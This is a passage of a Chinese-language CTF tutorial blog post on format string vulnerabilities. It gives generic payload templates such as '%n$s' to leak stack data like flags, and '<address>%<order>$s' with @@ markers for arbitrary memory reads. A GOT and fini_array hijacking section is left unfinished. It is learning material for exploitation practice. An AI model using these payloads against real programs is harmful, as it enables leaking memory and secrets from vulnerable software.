title="作用五："></a>作用五：</h2><p>直接泄露出栈上的数据，如果一些重要的信息比如flag直接放在栈上，那可以直接利用下面payload泄露出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;%n$s&#x27;</span><br></pre></td></tr></table></figure><h2 id="作用六："><a href="#作用六：" class="headerlink" title="作用六："></a>作用六：</h2><p>写地址进栈，来实现读任意地址内存</p><p>依旧是32位为例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &lt;address&gt;%&lt;order&gt;$s</span><br></pre></td></tr></table></figure><p> 这样就可以尝试读出，adress处对应的值，但是往往不会达到预期的目的，后来查了资料才知道</p><p>因为是%s，其遇到\x00就会直接断了，没有想要的输出。更常有的情况就是，会输出一大堆，然后我们想要的地址掺杂在里面，所以可以改进一下，可以加一组标记，然后再去取出来想要，这样也可以来检测是否被\x00截断了。<br> 改进：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = &lt;address&gt;@@%&lt;order&gt;$s@@</span><br></pre></td></tr></table></figure><p> 在使用的时候记得除去 **&lt; &gt;**。</p><p>64位的话就是地址放在后面</p><h2 id="作用七：劫持fini-array-劫持got表"><a href="#作用七：劫持fini-array-劫持got表" class="headerlink" title="作用七：劫持fini_array|劫持got表"></a>作用七：劫持fini_array|劫持got表</h2><p>待更新ing……</p><h2 id="写在最后："><a href="#写在最后：" class="headerlink" title="写在最后："></a>写在最后：</h2><p>这些就是很基础很基础的入门的运用了，其实真正的比赛往往考察的都是非栈上的格式化字符串漏洞，变量在.bss段或者别的地方，就得利用”四马分肥”和”诸葛连弩”这种精细的攻击手法，一点一点的去修改，还在学习ing……</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
